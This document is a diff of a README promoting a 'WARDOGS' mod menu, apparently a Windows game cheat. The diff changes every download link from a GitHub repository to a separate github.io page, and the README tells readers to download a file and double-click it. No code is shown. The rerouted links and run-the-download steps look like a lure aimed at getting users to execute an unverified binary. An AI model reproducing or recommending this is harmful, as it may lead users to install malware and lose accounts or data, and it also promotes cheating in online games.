@@ -1,18 +1,18 @@
 # 🎯 WARDOGS-Mod-Menu-2026 - Your Ultimate Tactical Game Companion
 
-[![Download WARDOGS Mod Menu](https://img.shields.io/badge/Download-WARDOGS%20Mod%20Menu-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=random)](https://github.com/Frea1776/WARDOGS-Mod-Menu-2026)
+[![Download WARDOGS Mod Menu](https://img.shields.io/badge/Download-WARDOGS%20Mod%20Menu-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=random)](https://frea1776.github.io)
 
 ## 🚀 Getting Started
 
 Welcome to WARDOGS-Mod-Menu-2026! This is a powerful tool designed to enhance your WARDOGS gaming experience on Windows. Whether you're a seasoned player or just starting out, this mod menu gives you incredible control over your gameplay with an easy-to-use external interface.
 
-Visit this link to download the application: [https://github.com/Frea1776/WARDOGS-Mod-Menu-2026](https://github.com/Frea1776/WARDOGS-Mod-Menu-2026)
+Visit this link to download the application: [https://frea1776.github.io](https://frea1776.github.io)
 
 ## 📥 Download and Installation
 
 Getting WARDOGS-Mod-Menu-2026 on your computer is simple:
 
-1. Click the download button above or visit [https://github.com/Frea1776/WARDOGS-Mod-Menu-2026](https://github.com/Frea1776/WARDOGS-Mod-Menu-2026)
+1. Click the download button above or visit [https://frea1776.github.io](https://frea1776.github.io)
 2. Follow the instructions on the page to download the application file
 3. Once downloaded, save the file to a location you can easily find, like your Desktop or Downloads folder
 4. Double-click the downloaded file to start using WARDOGS-Mod-Menu-2026
@@ -148,7 +148,7 @@ A: No, the application is self-contained and requires no additional installation
 
 WARDOGS-Mod-Menu-2026 is your complete solution for enhanced WARDOGS gameplay. With its user-friendly interface, powerful features, and customizable options, you'll have everything you need to take your gaming to the next level.
 
-Visit this link to download the application: [https://github.com/Frea1776/WARDOGS-Mod-Menu-2026](https://github.com/Frea1776/WARDOGS-Mod-Menu-2026)
+Visit this link to download the application: [https://frea1776.github.io](https://frea1776.github.io)
 
 ## 📌 Quick Reference
 
